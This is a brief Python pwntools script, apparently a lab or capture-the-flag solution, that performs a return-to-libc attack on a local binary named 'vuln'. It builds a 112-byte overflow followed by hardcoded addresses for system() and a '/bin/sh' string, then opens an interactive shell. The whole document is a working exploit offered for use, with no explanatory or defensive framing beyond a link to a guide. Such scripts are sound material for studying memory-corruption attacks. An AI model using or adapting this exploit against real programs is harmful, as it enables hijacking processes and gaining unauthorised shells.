# follow this guide: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
from pwn import *

e = ELF("./vuln")

payload1 = b'B'*112  #offset to the return address
system_address = p32(0xf7c48150)
bin_sh_address = p32(0xf7dbd0f5) #the address of /bin/sh function (shell), which will be the argument for system.

final_payload = payload1 + system_address + b'C'*4 + bin_sh_address

local = e.process([final_payload]) #end the payload as an argument from stdin when running the executable. 

print(local.recv())
local.interactive()






